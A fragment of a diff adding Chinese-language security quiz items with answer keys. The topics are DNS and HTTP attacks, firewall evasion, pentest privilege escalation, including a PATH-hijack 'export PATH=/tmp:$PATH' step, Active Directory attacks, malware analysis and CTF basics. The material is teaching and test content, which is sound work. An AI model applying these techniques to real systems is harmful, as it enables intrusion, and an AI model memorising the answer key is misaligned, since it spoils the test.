+      "explanation": "Follow TCP Stream 自动识别同一 TCP 连接（相同四元组：源IP、源端口、目标IP、目标端口）的所有包，按序列号顺序重组数据，红色显示客户端数据，蓝色显示服务器数据。是分析完整会话最直观的方法。"
+    }
+  ],
+  "net-03": [
+    {
+      "question": "递归查询和迭代查询在 DNS 解析中的区别是什么？",
+      "options": [
+        "递归查询更快",
+        "递归查询要求 DNS 服务器代为查询到底返回最终答案，迭代查询只返回下一步指引由查询方继续追踪",
+        "递归查询用 TCP，迭代查询用 UDP",
+        "两者完全相同"
+      ],
+      "answer": 1,
+      "explanation": "客户端到本地 DNS 通常使用递归查询（要求返回最终答案），本地 DNS 到根/TLD/权威服务器使用迭代查询（只返回'去问这个服务器'的指引）。递归查询将工作量交给了 DNS 服务器。"
+    },
+    {
+      "question": "DNS 缓存投毒攻击成功需要猜对哪两个值？",
+      "options": [
+        "源 IP 和目标 IP",
+        "Transaction ID 和 UDP 源端口",
+        "DNS 服务器的 MAC 地址",
+        "域名的 TTL 值"
+      ],
+      "answer": 1,
+      "explanation": "Transaction ID（16 bit，65536 种可能）和 UDP 源端口（16 bit，65536 种可能）都需要匹配。总共约 43 亿种组合。攻击者通过发送大量伪造响应来暴力猜中。源端口随机化是有效的防御手段。"
+    },
+    {
+      "question": "DNS 放大攻击利用了哪两个特性？",
+      "options": [
+        "DNS 使用 TCP 和加密",
+        "DNS 响应远大于查询（ANY 记录可达 66 倍放大），且 UDP 允许伪造源 IP",
+        "DNS 只支持 A 记录查询",
+        "DNS 服务器自动转发所有请求"
+      ],
+      "answer": 1,
+      "explanation": "DNS 放大攻击利用：1) 响应放大——ANY 查询的响应可达查询的 66 倍大；2) UDP 无连接特性允许伪造源 IP，将攻击流量导向受害者。1Mbps 攻击流量可产生约 66Mbps 的反射攻击。"
+    },
+    {
+      "question": "哪种 Wireshark 过滤器最适合检测 DNS 隧道？",
+      "options": [
+        "dns.qry.type == 1",
+        "udp.port == 53",
+        "dns.qry.name.len > 50",
+        "dns.response.code == 0"
+      ],
+      "answer": 2,
+      "explanation": "DNS 隧道将数据编码到子域名中，导致查询名称异常长（通常超过 50 字符）。正常域名很少有这么长的标签。dns.qry.name.len > 50 可有效筛选可疑的长域名查询。"
+    },
+    {
+      "question": "子域名接管（Subdomain Takeover）攻击的前提条件是什么？",
+      "options": [
+        "DNS 服务器被入侵",
+        "CNAME 记录指向已释放或不再使用的第三方服务",
+        "网站使用 HTTP 而非 HTTPS",
+        "DNS 服务器未部署 DNSSEC"
+      ],
+      "answer": 1,
+      "explanation": "当 CNAME 记录指向已被删除的第三方服务（如已注销的 GitHub Pages、已释放的 S3 存储桶）时，攻击者注册同名服务即可接管该子域名。防御方法：定期审计 CNAME 记录，删除指向无效目标的记录。"
+    },
+    {
+      "question": "DNSSEC 主要解决 DNS 的哪个安全问题？",
+      "options": [
+        "DNS 查询被窃听",
+        "DNS 响应被伪造（缓存投毒），通过数字签名验证响应的真实性",
+        "DNS 查询速度慢",
+        "DNS 不支持 IPv6"
+      ],
+      "answer": 1,
+      "explanation": "DNSSEC 通过数字签名（RRSIG）和公钥（DNSKEY）建立从根区到域名的信任链，验证 DNS 响应的真实性。但它不加密查询内容（不能防窃听），也不提升查询速度。DoH/DoT 用于加密 DNS 查询。"
+    }
+  ],
+  "net-04": [
+    {
+      "question": "HTTP 响应头 Strict-Transport-Security（HSTS）的主要作用是什么？",
+      "options": [
+        "加密 HTTP 内容",
+        "强制浏览器在指定时间内只使用 HTTPS 访问该站点，防止 SSL Strip 降级攻击",
+        "防止 CSRF 攻击",
+        "限制 CORS 跨域请求"
+      ],
+      "answer": 1,
+      "explanation": "HSTS 告诉浏览器在 max-age 期间内（通常一年）对该域名强制使用 HTTPS。即使用户输入 http:// 也会被浏览器自动升级为 https://。这有效防止了 SSL Strip 攻击（中间人将 HTTPS 链接降级为 HTTP）。"
+    },
+    {
+      "question": "HTTP 请求走私（Request Smuggling）攻击的核心原理是什么？",
+      "options": [
+        "HTTP 协议不加密",
+        "前端代理和后端服务器对请求边界的判定方式不一致（如 CL vs TE）",
+        "浏览器发送了畸形的请求",
+        "服务器不支持 HTTP/2"
+      ],
+      "answer": 1,
+      "explanation": "当前端用 Content-Length 判断请求长度，后端用 Transfer-Encoding: chunked 判断（或反之），攻击者构造歧义请求，使前后端看到不同的请求边界。走私的请求可绕过 WAF 认证、窃取其他用户数据、或投毒缓存。"
+    },
+    {
+      "question": "TLS 握手中 SNI（Server Name Indication）的安全问题是什么？",
+      "options": [
+        "导致证书验证失败",
+        "在 Client Hello 中明文传输，暴露用户访问的域名",
+        "只支持 IPv4",
+        "增加握手延迟"
+      ],
+      "answer": 1,
+      "explanation": "即使使用 HTTPS 加密，TLS Client Hello 中的 SNI 仍是明文。ISP 或中间人可以看到你访问的域名（虽然不知道具体 URL）。这就是为什么 ESNI/ECH（加密 SNI）正在被推广。"
+    },
+    {
+      "question": "HTTP 头注入（CRLF Injection）中，%0d%0a 代表什么？",
+      "options": [
+        "空字符（Null byte）",
+        "回车换行符（\\r\\n），是 HTTP 头部的分隔符",
+        "URL 分隔符",
+        "Base64 编码标记"
+      ],
+      "answer": 1,
+      "explanation": "%0d%0a 是 URL 编码的 CRLF（\\r\\n）。HTTP 用 CRLF 分隔头部字段，攻击者在用户输入中注入 CRLF 可在响应中插入新头部（如 Set-Cookie），实现 Cookie 注入、XSS 或缓存投毒。"
+    },
+    {
+      "question": "TRACE HTTP 方法为什么应该在生产环境中禁用？",
+      "options": [
+        "它会消耗大量服务器资源",
+        "它将请求原样返回，可被用于跨站追踪（XST）窃取 Cookie",
+        "它不支持 HTTPS",
+        "它会导致缓存失效"
+      ],
+      "answer": 1,
+      "explanation": "TRACE 方法将收到的请求（包括所有头部）原样返回给客户端。攻击者结合 XSS 可利用 TRACE 窃取用户的认证 Cookie 和其他敏感头部，这就是 XST（Cross-Site Tracing）攻击。"
+    },
+    {
+      "question": "以下哪个不是安全相关的 HTTP 响应头？",
+      "options": [
+        "Content-Security-Policy",
+        "X-Frame-Options",
+        "Content-Type",
+        "X-Content-Type-Options"
+      ],
+      "answer": 2,
+      "explanation": "Content-Type 是标准 HTTP 头，声明响应体的 MIME 类型，不是安全头。CSP 防 XSS，X-Frame-Options 防点击劫持，X-Content-Type-Options 防 MIME 混淆——三者都是安全响应头。"
+    }
+  ],
+  "net-05": [
+    {
+      "question": "IP 分片绕过防火墙的基本原理是什么？",
+      "options": [
+        "加密数据包使防火墙无法解密",
+        "将攻击特征拆分到多个小片段中，每个片段单独不含完整签名",
+        "增大 TTL 使包在到达防火墙前丢弃",
+        "使用 UDP 代替 TCP"
+      ],
+      "answer": 1,
+      "explanation": "IP 分片将包含攻击特征的包拆成多个片段。如果 IDS/防火墙不做分片重组就直接匹配签名，每个片段都不包含完整的攻击特征字符串，从而绕过检测。防御方法是在 IDS 层面先进行分片重组再做签名匹配。"
+    },
+    {
+      "question": "DNS 隧道能绕过防火墙的主要原因是什么？",
+      "options": [
+        "DNS 流量被加密了",
+        "防火墙通常必须允许 DNS 流量（端口 53）通过",
+        "DNS 使用 TCP 协议",
+        "DNS 数据包太小不被检查"
+      ],
+      "answer": 1,
+      "explanation": "防火墙必须放行 DNS 流量（否则无法解析域名），攻击者利用这个'白名单通道'将数据编码到 DNS 查询的子域名或 TXT 记录响应中。防御需要深度包检测（DPI）和行为分析，而非简单的端口规则。"
+    },
+    {
+      "question": "Nmap 的 -D 参数（诱饵扫描）如何工作？",
+      "options": [
+        "加速扫描过程",
+        "同时使用多个伪造 IP 和真实 IP 发送探测包，使目标无法确定真实攻击者",
+        "绕过防火墙分片检测",
+        "自动选择最优端口"
+      ],
+      "answer": 1,
+      "explanation": "-D 参数让 Nmap 用诱饵 IP 和真实 IP 同时发送探测包。目标日志中出现多个源 IP 的扫描记录，无法区分哪个是真实攻击者。这增加了溯源难度但不阻止 IDS 检测到扫描行为本身。"
+    },
+    {
+      "question": "防火墙规则审计中最常见的安全隐患是什么？",
+      "options": [
+        "规则数量太多",
+        "缺少默认拒绝（Default Deny）规则，未明确禁止的流量被放行",
+        "规则更新太频繁",
+        "使用了状态检测"
+      ],
+      "answer": 1,
+      "explanation": "没有默认拒绝规则意味着任何未被明确禁止的流量都会被放行。攻击者可以利用未覆盖的端口或协议绕过防火墙。最佳实践是在规则末尾添加 DENY ALL 兜底规则。"
+    },
+    {
+      "question": "WAF 绕过中 HTTP 参数污染（HPP）的原理是什么？",
+      "options": [
+        "发送超大参数值导致 WAF 崩溃",
+        "发送同名但值不同的多个参数，WAF 和后端应用可能解析不同的参数值",
+        "使用加密参数绕过检测",
+        "用 POST 替代 GET 方法"
+      ],
+      "answer": 1,
+      "explanation": "HPP 利用 WAF 和后端对同名重复参数的处理差异。WAF 可能只检查第一个参数值（安全），后端使用最后一个（恶意）。攻击载荷在 WAF 检查时被忽略但在后端被执行。"
+    },
+    {
+      "question": "防御深度（Defense in Depth）策略的核心理念是什么？",
+      "options": [
+        "只使用一种最强的防火墙",
+        "部署多层防线（防火墙 + IDS + WAF + 应用验证），确保一层被绕过时其他层仍可检测和阻止攻击",
+        "只依赖 IDS 进行检测",
+        "关闭所有端口禁止所有流量"
+      ],
+      "answer": 1,
+      "explanation": "纵深防御部署多层安全控制，每层独立运作。即使攻击者绕过防火墙，IDS 仍可检测；即使 IDS 被规避，WAF 仍可拦截；即使 WAF 被绕过，应用层验证仍可阻止恶意输入。没有单一防御是完美的，多层防御提高攻击成本。"
+    }
+  ],
+  "pentest-01-01": [
+    {
+      "question": "在渗透测试中，以下哪项属于被动侦察（不直接接触目标系统）？",
+      "options": [
+        "使用 nmap 进行全端口扫描",
+        "使用 ffuf 进行目录枚举",
+        "通过 crt.sh 查询 SSL 证书透明度日志发现子域名",
+        "使用 Nikto 进行 Web 漏洞扫描"
+      ],
+      "answer": 2,
+      "explanation": "crt.sh 查询 SSL 证书透明度日志是被动侦察，因为它只查询公开的证书日志数据库，不会与目标系统建立任何连接。而 nmap、ffuf、Nikto 都会直接向目标发送数据包，属于主动侦察。"
+    },
+    {
+      "question": "通过 nmap 扫描发现目标的 MySQL 3306 端口直接暴露在公网，以下哪种说法最准确？",
+      "options": [
+        "这是正常配置，MySQL 需要公网访问才能工作",
+        "这是一个高风险配置，数据库不应该直接暴露在公网",
+        "只要设置了强密码，暴露在公网也没问题",
+        "MySQL 端口暴露只有在 Windows 系统上才是风险"
+      ],
+      "answer": 1,
+      "explanation": "数据库端口（如 MySQL 3306）直接暴露在公网是高风险配置。即使设置了强密码，也可能面临暴力破解、已知漏洞利用等风险。正确的做法是将数据库放在内网，仅允许应用服务器访问。"
+    },
+    {
+      "question": "在目录枚举中发现目标的 .git/HEAD 文件可访问，这意味着什么？",
+      "options": [
+        "目标使用了 Git 进行开发，但没有安全问题",
+        "整个 Git 仓库可能被下载，导致源代码和敏感信息泄露",
+        "这只是 Git 的安装标记文件，没有实际价值",
+        "只有 HEAD 文件可用，无法获取完整仓库"
+      ],
+      "answer": 1,
+      "explanation": ".git 目录暴露是严重的安全问题。攻击者可以使用 git-dumper 等工具下载完整的 Git 仓库，获取源代码、提交历史、配置文件中可能包含的密钥和密码。这被标记为 CRITICAL 级别发现。"
+    }
+  ],
+  "pentest-02-01": [
+    {
+      "question": "在 Linux 系统上，你以 www-data 用户获得了一个 shell。通过 LinPEAS 发现一个 SUID 程序调用了 tar 但没有使用绝对路径。你应该如何提权？",
+      "options": [
+        "直接运行该 SUID 程序并等待它自动提权",
+        "在 PATH 前面添加一个包含恶意 tar 脚本的目录，然后运行该 SUID 程序",
+        "使用 sudo 以 root 权限运行该程序",
+        "修改 SUID 程序的源代码来添加后门"
+      ],
+      "answer": 1,
+      "explanation": "这是经典的 PATH 劫持攻击。当 SUID 程序调用 tar 但没有使用绝对路径（如 /bin/tar）时，系统会按照 PATH 环境变量的顺序查找可执行文件。我们在 /tmp 下创建一个恶意的 tar 脚本，然后通过 export PATH=/tmp:$PATH 让 SUID 程序优先执行我们的恶意版本。"
+    },
+    {
+      "question": "在 Windows 系统上，你发现当前用户拥有 SeImpersonatePrivilege 权限。以下哪种攻击最可能直接提权到 SYSTEM？",
+      "options": [
+        "修改注册表中的服务路径",
+        "使用 PrintSpoofer 或 JuicyPotato 工具",
+        "暴力破解管理员密码",
+        "利用 SMB 漏洞"
+      ],
+      "answer": 1,
+      "explanation": "SeImpersonatePrivilege 允许进程模拟其他用户身份。PrintSpoofer 和 JuicyPotato 等工具正是利用这个权限来创建 SYSTEM 级别的令牌并执行任意命令。这是 Windows Web 服务账户最常见的提权路径之一。"
+    },
+    {
+      "question": "以下哪种提权方式的风险最高，可能导致系统崩溃？",
+      "options": [
+        "Cron Job 劫持",
+        "PATH 环境变量劫持",
+        "Linux 内核漏洞利用",
+        "从配置文件中获取明文密码"
+      ],
+      "answer": 2,
+      "explanation": "内核漏洞利用直接在操作系统内核层面操作，如果利用失败可能导致内核 panic（系统崩溃）、数据丢失或系统不稳定。相比之下，PATH 劫持、Cron Job 劫持和凭证利用都是在用户空间操作，失败也不会导致系统崩溃。因此内核漏洞利用通常作为最后的手段。"
+    }
+  ],
+  "pentest-03-01": [
+    {
+      "question": "在 Metasploit 中，Meterpreter Payload 与普通命令行 Shell 相比，最大的优势是什么？",
+      "options": [
+        "Meterpreter 运行速度更快",
+        "Meterpreter 运行在内存中不落地磁盘，并提供丰富的后渗透功能",
+        "Meterpreter 不会被任何杀毒软件检测到",
+        "Meterpreter 只能在 Windows 上使用"
+      ],
+      "answer": 1,
+      "explanation": "Meterpreter 是 Metasploit 的高级 Payload，它完全运行在目标内存中，不会在磁盘上留下文件（减少被检测的痕迹）。它提供了文件操作、进程管理、网络探测、键盘记录等丰富的后渗透功能，远超基础命令行 Shell。"
+    },
+    {
+      "question": "Metasploit 中的 Pivoting（枢纽）功能用于什么场景？",
+      "options": [
+        "加密与目标之间的通信",
+        "通过已控制的机器作为跳板，访问内部网络中其他不可直达的主机",
+        "同时攻击多个目标",
+        "将 Payload 编码为不同格式"
+      ],
+      "answer": 1,
+      "explanation": "Pivoting 是通过已控制的机器（跳板）设置路由，使得攻击者可以通过该机器访问内部网络中原本无法直接到达的主机。例如，通过外网 Web 服务器访问内网的数据库服务器。这是渗透测试中非常重要的技术，使得攻击者能够从外部逐步深入到内部网络。"
+    },
+    {
+      "question": "关于 Metasploit 的资源脚本（Resource Scripts），以下哪个描述是正确的？",
+      "options": [
+        "资源脚本只能手动在 msfconsole 中逐行输入",
+        "资源脚本可以将重复性的操作写成脚本文件，通过 -r 参数一键执行",
+        "资源脚本只能用于漏洞利用，不能用于扫描",
+        "资源脚本使用 Python 语言编写"
+      ],
+      "answer": 1,
+      "explanation": "资源脚本（.rc 文件）是 Metasploit 的自动化功能，可以将一系列命令（如设置工作空间、选择模块、配置参数、执行攻击）写入一个文本文件，然后通过 msfconsole -r script.rc 一键执行。这对于重复性的渗透测试流程非常有用。"
+    }
+  ],
+  "pentest-04-01": [
+    {
+      "question": "Kerberoasting 攻击的核心原理是什么？",
+      "options": [
+        "直接暴力破解 Kerberos 协议的加密算法",
+        "请求服务票据（TGS），然后对票据中用服务账户密钥加密的部分进行离线破解",
+        "伪造域控制器的响应来欺骗客户端",
+        "利用 Kerberos 协议的网络传输漏洞进行中间人攻击"
+      ],
+      "answer": 1,
+      "explanation": "Kerberoasting 利用的是 Kerberos 协议的设计特性：任何域用户都可以请求任何 SPN 的服务票据（TGS），而 TGS 的一部分是用服务账户的密钥（NTLM 哈希）加密的。攻击者可以离线暴力破解这个加密部分，从而获取服务账户的明文密码。这个过程不需要特殊的权限，只需要一个有效的域用户账户。"
+    },
+    {
+      "question": "Golden Ticket 攻击成功后，为什么即使重置目标用户密码也无法使票据失效？",
+      "options": [
+        "因为 Golden Ticket 存储在用户本地，不受域控影响",
+        "因为 Golden Ticket 使用的是 krbtgt 账户的密钥，而不是用户密码",
+        "因为 Golden Ticket 使用了不可逆的加密算法",
+        "因为 Windows 不会验证过期的 Kerberos 票据"
+      ],
+      "answer": 1,
+      "explanation": "Golden Ticket 是用 krbtgt 账户的 NTLM 哈希签名的伪造 TGT（票据授予票据）。它的验证依赖于 krbtgt 的密钥，而不是目标用户的密码。因此重置用户密码对 Golden Ticket 没有影响。要使其失效，必须重置 krbtgt 账户的密码两次（因为 AD 保留一个历史密钥用于向后兼容）。"
+    },
+    {
+      "question": "BloodHound 在 AD 渗透测试中的核心作用是什么？",
+      "options": [
+        "直接利用 AD 漏洞获取域管理员权限",
+        "使用图论分析域内权限关系，自动发现从当前用户到域管理员的最短攻击路径",
+        "加密域控制器的通信流量",
+        "自动化执行 Kerberoasting 攻击"
+      ],
+      "answer": 1,
+      "explanation": "BloodHound 通过采集域内的用户、组、ACL（访问控制列表）、会话等信息，使用图论算法构建权限关系图。它可以自动找出从当前低权限用户到域管理员的最短攻击路径，极大地提高了域渗透测试的效率。没有 BloodHound，手动分析数百个权限关系可能需要数天时间。"
+    }
+  ],
+  "pentest-05-01": [
+    {
+      "question": "在 Windows 横向移动中，WMI 相比 PsExec 的主要优势是什么？",
+      "options": [
+        "WMI 执行速度更快",
+        "WMI 不需要管理员权限",
+        "WMI 不需要在目标上创建服务，因此更隐蔽",
+        "WMI 可以跨平台使用"
+      ],
+      "answer": 2,
+      "explanation": "PsExec 通过在目标上创建一个 Windows 服务来执行命令，这会留下服务创建事件日志（Event ID 7045）。而 WMI 是 Windows 内置的管理框架，远程执行命令时不需要创建服务，留下的痕迹更少，因此更难被检测到。两者都需要管理员权限。"
+    },
+    {
+      "question": "以下哪种 Windows 持久化技术被认为最隐蔽，最难被常规检测发现？",
+      "options": [
+        "在注册表 Run Key 中添加启动项",
+        "创建 Windows 计划任务",
+        "WMI 事件订阅持久化",
+        "创建新的 Windows 服务"
+      ],
+      "answer": 2,
+      "explanation": "WMI 事件订阅持久化将恶意触发器存储在 WMI 仓库中（二进制文件），不在注册表或文件系统中留下明显痕迹。常规的启动项检查工具（如 Autoruns）可能不会显示 WMI 事件订阅，需要使用专门的 WMI 查询命令才能检测。相比之下，Run Key、计划任务和服务都更容易被发现。"
+    },
+    {
+      "question": "在授权的渗透测试结束后，以下哪项是最重要的后续工作？",
+      "options": [
+        "删除所有扫描工具的日志",
+        "在报告中详细记录所有创建的后门和持久化机制，帮助客户清除",
+        "保留一个后门以备后续复测使用",
+        "仅向客户提供漏洞列表，不需要记录操作细节"
+      ],
+      "answer": 1,
+      "explanation": "在授权的渗透测试中，必须在报告中详细记录所有创建的后门、持久化机制、上传的工具文件和外传的数据。这是职业道德的要求，也是帮助客户在测试后恢复系统安全状态的必要信息。留下未记录的后门不仅是违法行为，也会严重损害测试团队的信誉。"
+    }
+  ],
+  "malw-01-01": [
+    {
+      "question": "以下哪种恶意软件类型能够独立传播，不需要宿主文件？",
+      "options": [
+        "病毒（Virus）",
+        "蠕虫（Worm）",
+        "木马（Trojan）",
+        "广告软件（Adware）"
+      ],
+      "answer": 1,
+      "explanation": "蠕虫（Worm）可以独立传播，不需要依附于宿主文件。病毒需要感染其他文件，木马依赖社会工程学诱骗用户执行，而蠕虫如WannaCry利用网络漏洞自动扩散。"
+    },
+    {
+      "question": "Stuxnet通过USB传播时，利用了什么漏洞来触发恶意代码执行？",
+      "options": [
+        "autorun.inf 自动运行",
+        "Windows LNK 文件解析漏洞（CVE-2010-2568）",
+        "USB 固件漏洞",
+        "Windows 驱动签名绕过"
+      ],
+      "answer": 1,
+      "explanation": "Stuxnet利用Windows LNK漏洞（CVE-2010-2568），仅仅在资源管理器中浏览USB内容就能触发代码执行，不需要打开任何文件。这比传统的autorun方式更加隐蔽。"
+    },
+    {
+      "question": "Emotet在现代恶意软件生态中扮演什么角色？",
+      "options": [
+        "仅是一个银行木马",
+        "一个杀毒软件",
+        "恶意软件分发平台（MaaS），为其他恶意软件提供传播通道",
+        "一个合法的远程管理工具"
+      ],
+      "answer": 2,
+      "explanation": "Emotet从最初的银行木马演变为恶意软件即服务（Malware-as-a-Service）平台，向其他犯罪分子出租其僵尸网络，用于分发TrickBot、Ryuk、Cobalt Strike等其他恶意软件。"
+    }
+  ],
+  "malw-01-02": [
+    {
+      "question": "在恶意软件分析中，为什么推荐先进行静态分析再进行动态分析？",
+      "options": [
+        "因为静态分析更有趣",
+        "因为静态分析不需要运行样本，更安全；同时可以为动态分析提供方向",
+        "因为动态分析已经被淘汰了",
+        "因为静态分析能检测到所有恶意行为"
+      ],
+      "answer": 1,
+      "explanation": "静态分析不执行恶意代码就能获取关键信息（如导入表、字符串、熵值），是安全的分析方式。通过静态分析了解样本特征后，可以有针对性地设计动态分析实验，提高效率。"
+    },
+    {
+      "question": "PE文件某个节区的信息熵值为7.8，这最可能意味着什么？",
+      "options": [
+        "文件已损坏",
+        "该节区包含大量英文字符串",
+        "该节区数据已被加壳或加密",
+        "这是一个正常的PE文件"
+      ],
+      "answer": 2,
+      "explanation": "信息熵范围0-8，正常PE文件节区熵值通常在4.5-6.5之间。超过7.0几乎可以确定存在加壳（如UPX）或加密，说明数据被高度随机化处理过。"
+    },
+    {
+      "question": "在动态分析中，Process Monitor（ProcMon）主要监控什么？",
+      "options": [
+        "仅监控网络连接",
+        "仅监控CPU使用率",
+        "文件操作、注册表修改、进程/线程活动和网络连接",
+        "仅监控图形界面操作"
+      ],
+      "answer": 2,
+      "explanation": "Process Monitor是动态分析的核心工具，它记录每一个文件操作（CreateFile、ReadFile等）、注册表修改（RegSetValue等）、进程/线程活动以及网络连接，提供完整的系统行为视图。"
+    }
+  ],
+  "malw-02-01": [
+    {
+      "question": "以下YARA规则条件中，哪个能有效减少误报？",
+      "options": [
+        "仅匹配一个字符串 'powershell'",
+        "匹配 'powershell' 且文件是 PE 格式且有特定的导入表组合",
+        "使用 --fast-scan 模式",
+        "将规则名称改得更具体"
+      ],
+      "answer": 1,
+      "explanation": "仅匹配'powershell'会产生大量误报（很多合法脚本包含这个词）。组合多个条件（文件类型检查 + 字符串匹配 + 导入表验证）能大幅提高精确率，减少误报。"
+    },
+    {
+      "question": "YARA规则中，十六进制模式 { 4D 5A ?? 00 } 中的 '??' 表示什么？",
+      "options": [
+        "匹配空格字符",
+        "匹配任意单字节（通配符）",
+        "匹配问号字符本身",
+        "匹配零字节"
+      ],
+      "answer": 1,
+      "explanation": "'??' 是YARA十六进制模式中的单字节通配符，可以匹配任意一个字节值（0x00-0xFF）。这用于跳过不确定的地址偏移，使规则更加健壮。"
+    },
+    {
+      "question": "在为WannaCry编写YARA规则时，以下哪个特征最具唯一性（最不容易被变种修改）？",
+      "options": [
+        "文件名 'tasksche.exe'",
+        "勒索信文本 'Oops, your files have been encrypted!'",
+        "加密例程中的特定字节码序列和 'WANACRY!' 魔数",
+        "文件大小"
+      ],
+      "answer": 2,
+      "explanation": "文件名和勒索信文本容易被修改。但加密例程的核心字节码序列和文件头中的 'WANACRY!' 魔数是代码逻辑的一部分，修改它们会影响程序功能，因此在变种中通常保持不变。"
+    }
+  ],
+  "malw-03-01": [
+    {
+      "question": "Stuxnet的攻击目标是什么？",
+      "options": [
+        "全球银行系统",
+        "伊朗纳坦兹铀浓缩设施的工业控制系统",
+        "美国电网",
+        "社交媒体平台"
+      ],
+      "answer": 1,
+      "explanation": "Stuxnet精确针对伊朗纳坦兹铀浓缩工厂中的西门子S7-300 PLC，这些PLC控制铀浓缩离心机的转速。它通过反复改变离心机转速（1410Hz→1280Hz→2Hz）来造成物理破坏。"
+    },
+    {
+      "question": "NotPetya表面上是勒索软件，但它的真正目的是什么？",
+      "options": [
+        "窃取银行凭证",
+        "挖矿",
+        "不可逆的数据破坏",
+        "DDoS攻击"
+      ],
+      "answer": 2,
+      "explanation": "NotPetya伪装为勒索软件，但实际上它是一个破坏性武器。它覆写MBR、加密数据且故意设计为不可恢复（即使支付赎金也无法解密），其真正目的是造成最大程度的数据破坏。"
+    },
+    {
+      "question": "以下哪个不是近年来供应链攻击的共同特征？",
+      "options": [
+        "攻击者入侵软件构建系统或更新通道",
+        "利用信任关系进行传播",
+        "仅通过USB设备传播",
+        "影响范围广且检测困难"
+      ],
+      "answer": 2,
+      "explanation": "供应链攻击（如SolarWinds、MOVEit、XZ Utils）的共同特征是利用信任关系（软件供应商、开源社区）进行传播，影响范围广且检测困难。USB传播是传统方式，不是供应链攻击的特征。"
+    }
+  ],
+  "malw-04-01": [
+    {
+      "question": "以下哪种技术不是恶意软件用来检测沙箱环境的方法？",
+      "options": [
+        "检查CPU核数和内存大小",
+        "检查系统运行时间是否过短",
+        "使用AES-256加密文件",
+        "检查鼠标是否移动过"
+      ],
+      "answer": 2,
+      "explanation": "AES-256加密文件是勒索软件的恶意行为，与沙箱检测无关。检查硬件规格（CPU/内存）、系统运行时间、鼠标/键盘活动都是常见的沙箱检测方法。"
+    },
+    {
+      "question": "CAPE Sandbox相比Cuckoo Sandbox的主要增强功能是什么？",
+      "options": [
+        "更快的分析速度",
+        "自动载荷提取和反反沙箱能力",
+        "更美观的Web界面",
+        "仅支持Linux样本"
+      ],
+      "answer": 1,
+      "explanation": "CAPE在Cuckoo基础上增加了自动载荷提取（从加壳/加密样本中提取内嵌载荷）、反反沙箱（自动绕过沙箱检测）、多阶段分析（自动追踪多层恶意软件）等高级功能。"
+    },
+    {
+      "question": "一个成熟的自动化恶意软件分析工作流的正确顺序是什么？",
+      "options": [
+        "威胁情报共享 → 沙箱分析 → 样本采集 → YARA规则生成",
+        "样本采集 → 自动化沙箱分析 → IOC提取 → YARA规则生成 → 威胁情报共享",
+        "手动逆向工程 → 沙箱分析 → 报告撰写 → 邮件通知",
+        "YARA规则生成 → 样本采集 → IOC提取 → 沙箱分析"
+      ],
+      "answer": 1,
+      "explanation": "正确的工作流是：样本采集（邮件网关、EDR、IDS）→ 自动化沙箱分析 → IOC提取 → YARA规则自动生成 → 威胁情报共享（MISP）→ 防御规则更新。这个流水线实现端到端的自动化。"
+    }
+  ],
+  "ctfg-01-01": [
+    {
+      "question": "CTF 比赛中，flag 的常见格式是什么？",
+      "options": [
+        "password{xxxxxxx}",
+        "flag{xxxxxxx} 或 CTF{xxxxxxx}",
+        "secret(xxxxxxx)",
+        "key[xxxxxxx]"
+      ],
+      "answer": 1,
+      "explanation": "CTF 比赛中 flag 最常见的格式是 flag{xxxxxxx} 或 CTF{xxxxxxx}，有些平台会使用自己的前缀如 ctfshow{...}。"
+    },
+    {
+      "question": "Base64 编码的典型特征是什么？",
+      "options": [
+        "只包含数字 0-9",
+        "以 ## 开头",
+        "使用 A-Z、a-z、0-9、+、/ 字符，末尾可能有 = 填充",
+        "全部为大写字母"
+      ],
+      "answer": 2,
+      "explanation": "Base64 使用 64 个字符（A-Z, a-z, 0-9, +, /）编码数据，当数据长度不是 3 的倍数时，末尾会用 = 号进行填充。"
+    },
+    {
+      "question": "CTF 比赛中遇到一道难题卡壳超过 30 分钟，最佳策略是什么？",
+      "options": [
+        "继续死磕直到解出来",
+        "直接跳过这道题不再回来",
+        "先换一道题做，之后再回来攻坚",
+        "等待出题方放出完整解答"
+      ],
+      "answer": 2,
+      "explanation": "CTF 比赛是按总分计分的。在一道难题上死磕可能导致简单题没时间做。建议卡壳超过 30 分钟就先换题，保持得分效率。"
+    }
+  ],
+  "ctfg-02-01": [
+    {
+      "question": "栈溢出攻击的本质是什么？",
+      "options": [
+        "让程序消耗过多内存导致 OOM",
+        "通过超长输入覆盖函数返回地址，控制程序执行流",
+        "向程序注入恶意 SQL 语句",
+        "利用程序的格式化字符串漏洞"
+      ],
+      "answer": 1,
+      "explanation": "栈溢出攻击的核心是通过向缓冲区写入超长数据，覆盖栈上保存的返回地址，使程序跳转到攻击者指定的代码位置。"
+    },
+    {
+      "question": "在 Ret2libc 攻击中，为什么需要先泄露 libc 函数的地址？",
+      "options": [
+        "为了获取 libc 的版本号",
+        "因为 ASLR 会使 libc 每次加载的基地址随机化",
+        "为了修改 libc 中的函数代码",
+        "为了绕过 NX 保护"
+      ],
+      "answer": 1,
+      "explanation": "ASLR（地址空间布局随机化）使得每次运行时 libc 的基地址不同。通过泄露某个 libc 函数的实际地址，再减去其偏移，可以算出 libc 基地址，进而定位 system 和 /bin/sh 的位置。"
+    },
+    {
+      "question": "使用 pwntools 的 cyclic 工具确定偏移量的原理是什么？",
+      "options": [
+        "发送全 A 字符串观察崩溃位置",
+        "发送特殊模式字符串，根据崩溃时 RIP/EIP 的值反查偏移",
+        "逐字节增加输入长度直到崩溃",
+        "使用 GDB 直接查看缓冲区大小"
+      ],
+      "answer": 1,
+      "explanation": "cyclic 生成一个特殊的 de Bruijn 序列（如 aaaabaaacaaa...），每个 4/8 字节的子串都是唯一的。程序崩溃时 RIP 的值对应序列中某个唯一子串，用 cyclic_find 即可反查出精确偏移量。"
+    }
+  ],
+  "ctfg-03-01": [
+    {
+      "question": "Ghidra 最强大的功能是什么？",
+      "options": [
+        "汇编代码编辑",
+        "将汇编代码还原为类 C 的伪代码（反编译器）",
+        "自动生成 exploit 代码",
+        "实时网络流量分析"
+      ],
+      "answer": 1,
+      "explanation": "Ghidra 最核心的能力是其反编译器（Decompiler），能将机器码/汇编代码还原为可读的类 C 伪代码，极大降低了逆向分析的难度。"
+    },
+    {
+      "question": "在逆向分析中，交叉引用（XREF）的作用是什么？",
+      "options": [
+        "查看函数的执行时间",
+        "查看哪些代码引用了某个函数、变量或字符串",
+        "自动修复程序中的 bug",
+        "加密程序中的敏感字符串"
+      ],
+      "answer": 1,
+      "explanation": "交叉引用（XREF）是逆向分析的核心功能，它能告诉你某个符号（函数、变量、字符串）在哪些地方被引用或调用，帮助你理解程序的调用关系和数据流。"
+    },
+    {
